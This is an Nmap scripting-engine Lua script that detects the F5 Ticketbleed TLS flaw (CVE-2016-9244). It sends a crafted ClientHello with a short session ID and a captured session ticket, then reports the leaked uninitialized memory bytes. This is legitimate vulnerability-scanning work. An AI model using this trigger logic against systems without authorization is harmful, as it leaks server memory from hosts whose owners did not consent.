local bin = require("bin")
local match = require("match")
local nmap = require("nmap")
local packet = require "packet"
local shortport = require("shortport")
local sslcert = require("sslcert")
local stdnse = require("stdnse")
local table = require("table")
local tls = require "tls"
local vulns = require("vulns")

description = [[
Detects whether a server is vulnerable to the F5 Ticketbleed bug (CVE-2016-9244).

For additional information:
* https://filippo.io/Ticketbleed/
* https://blog.filippo.io/finding-ticketbleed/
* https://support.f5.com/csp/article/K05121675
]]

---
-- @usage
-- nmap -p 443 --script tls-ticketbleed <target>
--
-- @output
-- PORT    STATE SERVICE
-- 445/tcp open  https
-- | tls-ticketbleed:
-- |   VULNERABLE:
-- |   Ticketbleed is a serious issue in products manufactured by F5, a popular
-- vendor of TLS load-balancers. The issue allows for stealing information from
-- the load balancer
-- |     State: VULNERABLE (Exploitable)
-- |     Risk factor: High
-- |       Ticketbleed is vulnerability in the implementation of the TLS
-- SessionTicket extension found in some F5 products. It allows the leakage
-- ("bleeding") of up to 31 bytes of data from unin itialized memory. This is
-- caused by the TLS stack padding a Session ID, passed from the client, with
-- data to make it 32-bits long.
-- |     Exploit results:
-- |       2ab2ea6a4c167fbe8bf0b36c7d9ed6d3
-- |       *..jL......l}...
-- |     References:
-- |       https://filippo.io/Ticketbleed/
-- |       https://blog.filippo.io/finding-ticketbleed/
-- |_      https://support.f5.com/csp/article/K05121675
--
-- @args tls-ticketbleed.protocols (default tries all) TLSv1.0, TLSv1.1, or TLSv1.2

author = "Mak Kolybabi <mak@kolybabi.com>"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln", "safe"}

portrule = function(host, port)
  if not tls.handshake_parse.NewSessionTicket then
    stdnse.verbose1("Not running: incompatible tls.lua. Get the latest from https://nmap.org/nsedoc/lib/tls.html")
    return false
  end
  -- Ensure we have the privileges necessary to run the PCAP operations this
  -- script depends upon.
  if not nmap.is_privileged() then
    nmap.registry[SCRIPT_NAME] = nmap.registry[SCRIPT_NAME] or {}
    if not nmap.registry[SCRIPT_NAME].rootfail then
      stdnse.verbose1("Not running due to lack of privileges.")
    end

    nmap.registry[SCRIPT_NAME].rootfail = true

    return false
  end

  return shortport.ssl(host, port) or sslcert.getPrepareTLSWithoutReconnect(port)
end

local function is_vuln(host, port, version)
  -- Checking a host requires a valid TLS Session Ticket. The Nmap API
  -- does not expose that information to us, but it is sent
  -- unencrypted near the end of the TLS handshake.
  --
  -- First we must create a socket that is ready to start a TLS
  -- connection, so that we may find the local port from which it is
  -- sending, and can use that information to filter the PCAP.
  --
  -- We should have a way to specify version here, but we don't.
  local socket
  local starttls = sslcert.getPrepareTLSWithoutReconnect(port)
  if starttls then
    local status
    status, socket = starttls(host, port)
    if not status then
      stdnse.debug3("StartTLS connection to server failed: %s", socket)
      return
    end
  else
    socket = nmap.new_socket()
    local status, err = socket:connect(host, port, "tcp")
    if not status then
      stdnse.debug3("Connection to server failed: %s", err)
      return
    end
  end

  socket:set_timeout(5000)

  -- Find out the port we'll be using in our TLS negotiation.
  local status, _, lport = socket:get_info()
  if( not(status) ) then
    stdnse.debug3("Failed to retrieve local port used by socket.")
    return
  end

  -- We are only interested in capturing the TLS responses from the
  -- server, not our traffic. We need to set the snaplen to be fairly
  -- large to accommodate packets with many or large certificates.
  local filter = ("src host %s and tcp and src port %d and dst port %d"):format(host.ip, port.number, lport)
  local pcap = nmap.new_socket()
  pcap:set_timeout(5)
  pcap:pcap_open(host.interface, 4096, false, filter)

  -- Initiate the TLS negotiation on the already-connected socket, and
  -- then immediately close the socket.
  local status, err = socket:reconnect_ssl()
  if not status then
    stdnse.debug1("Can't connect with TLS: %s", err)
    return
  end
  socket:close()

  -- Repeatedly read previously-captured packets and add them to a
  -- buffer.
  local buf = {}
  while true do
    local status, _, _, layer3, _ = pcap:pcap_receive()
    if not status then
      break
    end

    -- Parse captured packet and extract data.
    local pkt = packet.Packet:new(layer3, #layer3)
    if not pkt then
      stdnse.debug3("Failed to create packet from captured data.")
      return
    end

    if not pkt:tcp_parse() then
      stdnse.debug3("Failed to parse captured packet.")
      return
    end

    local tls_data = pkt:raw(pkt.tcp_data_offset)
    table.insert(buf, tls_data)
  end

  buf = table.concat(buf, "")

  pcap:pcap_close()
  pcap:close()

  -- Attempt to find the NewSessionTicket record in the captured
  -- packets.
  local pos, ticket
  repeat
    -- Attempt to parse the buffer.
    local record
    pos, record = tls.record_read(buf, pos)
    if not record then
      break
    end
    if record.type ~= "handshake" then
      break
    end

    -- Search for the NewSessionTicket record, which contains the
    -- Session Ticket we need.
    for _, body in ipairs(record.body) do
      stdnse.debug1("Captured %s record.", body.type)
      if body.type == "NewSessionTicket" then
        if body.ticket then
          ticket = body.ticket
        else
          -- If someone downloaded this script separately from Nmap,
          -- they are likely to be missing the parsing changes to the
          -- TLS library. Try parsing the body inline.
          if #body.data <= 4 then
            stdnse.debug1("NewSessionTicket's body was too short to parse: %d bytes", #body.data)
            return
          end

          _, ticket = (">I4 s2"):unpack(body.data)
        end
        break
      end
    end
  until ticket or pos > #buf

  if not ticket then
    stdnse.debug1("Server did not send a NewSessionTicket record.")
    return
  end

  -- Create the ClientHello record that triggers the behaviour in
  -- affected systems. The record must include both a Session ID and a
  -- TLS Session Ticket extension.
  --
  -- Setting the Session ID to a 16 bytes allows for the remaining 16
  -- bytes of the field to be filled with uninitialized memory when it
  -- is echoed back in the ServerHelloDone record. Using 16 bytes
  -- reduces the chance of a false positive caused by the server
  -- issuing us a new, valid session ID that just happens to match the
  -- random one we provided.
  local sid_old = stdnse.generate_random_string(16)

  local hello = tls.client_hello({
    ["protocol"] = version,
    ["session_id"] = sid_old,
    -- Claim to support every cipher
    -- Doesn't work with IIS, but only F5 products should be affected
    ["ciphers"] = stdnse.keys(tls.CIPHERS),
    ["compressors"] = {"NULL"},
    ["extensions"] = {
      -- Claim to support common elliptic curves
      ["elliptic_curves"] = tls.EXTENSION_HELPERS["elliptic_curves"](tls.DEFAULT_ELLIPTIC_CURVES),
      ["SessionTicket TLS"] = ticket,
    },
  })

  -- Connect the socket so that it is ready to start a TLS session.
  if starttls then
    local status
    status, socket = starttls(host, port)
    if not status then
      stdnse.debug3("StartTLS connection to server failed: %s", socket)
      return
    end
  else
    socket = nmap.new_socket()
    local status, err = socket:connect(host, port, "tcp")
    if not status then
      stdnse.debug3("Connection to server failed: %s", err)
      return
    end
  end

  -- Send Client Hello to the target server.
  local status, err = socket:send(hello)
  if not status then
    stdnse.debug1("Couldn't send Client Hello: %s", err)
    socket:close()
    return
  end

  -- Read responses from server.
  local status, response, err = tls.record_buffer(socket)
  socket:close()
  if err == "TIMEOUT" then
    stdnse.debug1("Timeout exceeded waiting for Server Hello Done.")
    return
  end
  if not status then
    stdnse.debug1("Couldn't receive: %s", err)
    socket:close()
    return
  end

  -- Attempt to parse the response.
  local _, record = tls.record_read(response)
  if record == nil then
    stdnse.debug1("Unrecognized response from server.")
    return
  end
  if record.protocol ~= version then
    stdnse.debug1("Server responded with a different protocol than we requested: %s", record.protocol)
    return
  end
  if record.type ~= "handshake" then
    stdnse.debug1("Server failed to respond with a handshake record: %s", record.type)
    return
  end

  -- Search for the ServerHello record, which contains the Session ID
  -- we want.
  local sid_new
  for _, body in ipairs(record.body) do
    if body.type == "server_hello" then
      sid_new = body.session_id
    end
  end

  if not sid_new then
    stdnse.debug1("Failed to receive a Server Hello record.")
    return
  end

  if sid_new == "" then
    stdnse.debug1("Server did not respond with a session ID.")
    return
  end

  -- Check whether the Session ID matches what we originally sent,
  -- which should be the case for a properly-functioning TLS stacks.
  if sid_new == sid_old then
    stdnse.debug1("Server properly echoed our short, random session ID.")
    return
  end

  -- If the system is unaffected, it should provide a new session ID
  -- unrelated to the one we provided. Check for the new session ID
  -- being prefixed by the one we sent, indicating an affected system.
  if sid_new:sub(1, #sid_old) ~= sid_old then
    stdnse.debug1("Server responded with a new, unrelated session ID.")
    stdnse.debug1("Original session ID: %s", stdnse.tohex(sid_old, {separator = ":"}))
    stdnse.debug1("Received session ID: %s", stdnse.tohex(sid_new, {separator = ":"}))
    return
  end

  return sid_new
end

action = function(host, port)
  local vuln_table = {
    title = "Ticketbleed is a serious issue in products manufactured by F5, a popular vendor of TLS load-balancers. The issue allows for stealing information from the load balancer",
    state = vulns.STATE.NOT_VULN,
    risk_factor = "High",
    description = [[
Ticketbleed is vulnerability in the implementation of the TLS SessionTicket extension found in some F5 products. It allows the leakage ("bleeding") of up to 31 bytes of data from uninitialized memory. This is caused by the TLS stack padding a Session ID, passed from the client, with data to make it 32-bits long.
    ]],

    references = {
      "https://filippo.io/Ticketbleed/",
      "https://blog.filippo.io/finding-ticketbleed/",
      "https://support.f5.com/csp/article/K05121675"
    }
  }

  -- Accept user-specified protocols.
  local vers = stdnse.get_script_args(SCRIPT_NAME .. ".protocols") or {"TLSv1.0", "TLSv1.1", "TLSv1.2"}
  if type(vers) == "string" then
    vers = {vers}
  end

  for _, ver in ipairs(vers) do
    -- Ensure the protocol version is supported.
    if nil == tls.PROTOCOLS[ver] then
      return "\n  Unsupported protocol version: " .. ver
    end

    -- Check for the presence of the vulnerability.
    local sid = is_vuln(host, port, ver)
    if sid then
      vuln_table.state = vulns.STATE.EXPLOIT
      vuln_table.exploit_results = {
        stdnse.tohex(sid:sub(17)),
        (sid:sub(17):gsub("[^%g ]", "."))
      }
      break
    end
  end

  local report = vulns.Report:new(SCRIPT_NAME, host, port)
  return report:make_output(vuln_table)
end
